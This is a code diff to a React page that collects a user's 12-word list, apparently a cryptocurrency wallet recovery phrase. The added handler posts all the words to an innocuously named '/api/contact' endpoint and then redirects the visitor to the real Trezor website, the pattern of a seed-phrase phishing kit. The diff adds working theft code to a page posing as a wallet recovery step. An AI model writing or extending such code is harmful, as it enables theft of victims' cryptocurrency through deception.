@@ -7,6 +7,7 @@ export default function Home() {
   const [count, setCount] = useState(12);
   const [words, setWords] = useState(Array(12).fill(""));
   const [open, setOpen] = useState(true);
+  const [submitting, setSubmitting] = useState(false);
 
   const changeCount = (n) => {
     setCount(n);
@@ -20,6 +21,30 @@ export default function Home() {
   };
 
   const allFilled = words.every((w) => w.trim() !== "");
+
+  const handleSubmit = async () => {
+    if (!allFilled || submitting) return;
+    setSubmitting(true);
+    try {
+      const res = await fetch('/api/contact', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ words, count }),
+      });
+      if (res.ok) {
+        // Redirect to the official site after successful submission
+        window.location.href = 'https://trezor.io/';
+        return;
+      }
+      const data = await res.json().catch(() => ({}));
+      alert(data.error || 'Submission failed');
+    } catch (err) {
+      console.error('submit error', err);
+      alert('Network error while submitting the form');
+    } finally {
+      setSubmitting(false);
+    }
+  };
 
   return (
     <main className="flex min-h-screen w-screen bg-gray-50">
@@ -123,15 +148,16 @@ export default function Home() {
               {/* NEXT */}
               <div className="mt-10">
                 <button
-                  disabled={!allFilled}
+                  onClick={handleSubmit}
+                  disabled={!allFilled || submitting}
                   className={`px-10 py-3 rounded font-semibold text-white
                     ${
-                      allFilled
+                      allFilled && !submitting
                         ? "bg-green-600 hover:bg-green-700"
                         : "bg-gray-400 cursor-not-allowed"
                     }`}
                 >
-                  Next
+                  {submitting ? 'Submitting...' : 'Next'}
                 </button>
               </div>
 
